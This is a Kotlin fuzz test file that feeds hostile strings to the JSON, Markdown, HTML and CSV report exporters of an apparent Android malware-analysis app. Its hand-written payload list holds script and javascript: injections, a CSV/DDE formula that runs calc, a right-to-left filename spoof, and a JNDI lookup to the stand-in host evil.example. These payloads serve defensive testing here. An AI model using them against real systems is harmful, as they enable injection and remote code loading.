package com.pineandpackets.pocketlab.core.report

import com.pineandpackets.pocketlab.core.model.*
import com.pineandpackets.pocketlab.core.testing.FuzzHarness
import java.util.UUID
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * Fuzz tests for the report renderers. Sample-controlled strings are injected
 * into every report field that reaches an exporter, including hostile Unicode,
 * control characters, HTML/Markdown/CSV injection attempts, and very long
 * strings. All exporters must complete deterministically and must not crash.
 */
class ReportRendererFuzzTest {

    private val exporter = ReportExporter()

    private fun baseReport(): AnalysisReport = AnalysisReport(
        schemaVersion = "1.0.0",
        reportId = "fixed-report-id",
        caseId = "fixed-case-id",
        createdAt = "2026-08-07T00:00:00Z",
        analysisStartedAt = "2026-08-07T00:00:00Z",
        analysisCompletedAt = "2026-08-07T00:00:00Z",
        engine = EngineInfo(
            appVersion = "1.0.0",
            engineVersion = "1.0.0",
            reportSchemaVersion = "1.0.0",
            rulePackVersion = "1.0.0"
        ),
        settings = AnalysisSettings(
            analysisProfile = "standard",
            hashAlgorithms = listOf("SHA-256"),
            nativeAnalysisEnabled = true,
            deepDexAnalysisEnabled = true,
            iocExtractionEnabled = true
        ),
        source = SourceInfo(
            displayName = "s",
            mimeType = "application/vnd.android.package-archive",
            sizeReported = 1024,
            sizeActual = 1024,
            sha256 = "abc",
            sha1 = "def",
            md5 = "ghi"
        ),
        summary = ReportSummary(
            riskBand = RiskBand.SUSPICIOUS_CAPABILITIES,
            confidence = Confidence.HIGH,
            completeness = 1.0,
            findingCount = 1,
            maxSeverity = Severity.HIGH,
            topFindings = listOf("t")
        ),
        findings = listOf(
            Finding(
                id = "fid",
                ruleId = "R-1",
                title = "t",
                category = "c",
                severity = Severity.HIGH,
                confidence = Confidence.MEDIUM,
                simpleExplanation = "e",
                analystExplanation = "a",
                limitations = listOf("l"),
                recommendations = listOf("r")
            )
        ),
        indicators = listOf(
            Indicator(
                type = IndicatorType.DOMAIN,
                displayValue = "v",
                canonicalValue = "v",
                defangedValue = "v",
                confidence = Confidence.HIGH,
                classification = emptyList()
            )
        ),
        integrity = IntegrityBlock(
            sourceSha256 = "abc",
            reportSha256 = "xyz",
            engineVersion = "1.0.0",
            rulePackVersion = "1.0.0",
            sampleRetained = false
        )
    )

    private fun reportWithHostile(hostile: String): AnalysisReport {
        val r = baseReport()
        val source = r.source.copy(displayName = hostile)
        val finding = r.findings.first().copy(
            title = hostile,
            category = hostile,
            simpleExplanation = hostile,
            analystExplanation = hostile,
            limitations = listOf(hostile)
        )
        val summary = r.summary.copy(topFindings = listOf(hostile))
        val indicator = r.indicators.first().copy(
            displayValue = hostile,
            canonicalValue = hostile,
            defangedValue = hostile
        )
        return r.copy(source = source, findings = listOf(finding), summary = summary, indicators = listOf(indicator))
    }

    private fun hostileStrings(): List<String> {
        // Byte-level hostile content, decoded lossy into valid Kotlin strings.
        val corpus = FuzzHarness.corpus(
            prefixes = listOf(
                byteArrayOf(),
                "<script>".toByteArray(),
                "=HYPERLINK(".toByteArray(),
                "@SUM(".toByteArray(),
                "-cmd|".toByteArray(),
                "+111".toByteArray(),
                "javascript:".toByteArray(),
                "data:text/html,".toByteArray()
            ),
            sizes = intArrayOf(0, 1, 4, 8, 16, 32, 64, 128, 256, 512, 1024),
            perSize = 40,
            seed = 0x0A11_51FEL
        )
        val strings = corpus.map { bytes ->
            String(bytes, Charsets.UTF_8).replace("\u0000", "\uFFFD")
        }
        // Hand-crafted high-value injection payloads.
        return strings + listOf(
            "<script>alert(1)</script>",
            "![x](javascript:alert(1))",
            "=cmd|'/C calc'!A0",
            "\u202EEvil\u202E.apk",
            "a\u0000b",
            "X".repeat(20_000),
            "\uFFFE\uFFFF",
            "${'$'}{jndi:ldap://evil.example/x}"
        )
    }

    @Test
    fun `JSON renderer never crashes and is deterministic on hostile strings`() {
        val payloads = hostileStrings()
        val failures = FuzzHarness.fuzz(
            corpus = payloads.map { it.toByteArray() },
            determinismRuns = true
        ) { bytes ->
            val s = String(bytes, Charsets.UTF_8).replace("\u0000", "\uFFFD")
            exporter.exportToJson(reportWithHostile(s)).hashCode()
        }
        assertTrue("JSON renderer fuzz failures: $failures", failures.isEmpty())
    }

    @Test
    fun `Markdown renderer never crashes on hostile strings`() {
        val payloads = hostileStrings()
        val failures = FuzzHarness.fuzz(
            corpus = payloads.map { it.toByteArray() },
            determinismRuns = true
        ) { bytes ->
            val s = String(bytes, Charsets.UTF_8).replace("\u0000", "\uFFFD")
            exporter.exportToMarkdown(reportWithHostile(s)).length
        }
        assertTrue("Markdown renderer fuzz failures: $failures", failures.isEmpty())
    }

    @Test
    fun `HTML renderer never crashes on hostile strings`() {
        val payloads = hostileStrings()
        val failures = FuzzHarness.fuzz(
            corpus = payloads.map { it.toByteArray() },
            determinismRuns = true
        ) { bytes ->
            val s = String(bytes, Charsets.UTF_8).replace("\u0000", "\uFFFD")
            exporter.exportToHtml(reportWithHostile(s)).length
        }
        assertTrue("HTML renderer fuzz failures: $failures", failures.isEmpty())
    }

    @Test
    fun `IOC CSV renderer never crashes on hostile strings`() {
        val payloads = hostileStrings()
        val failures = FuzzHarness.fuzz(
            corpus = payloads.map { it.toByteArray() },
            determinismRuns = true
        ) { bytes ->
            val s = String(bytes, Charsets.UTF_8).replace("\u0000", "\uFFFD")
            exporter.exportIocsToCsv(reportWithHostile(s)).length
        }
        assertTrue("IOC CSV renderer fuzz failures: $failures", failures.isEmpty())
    }
}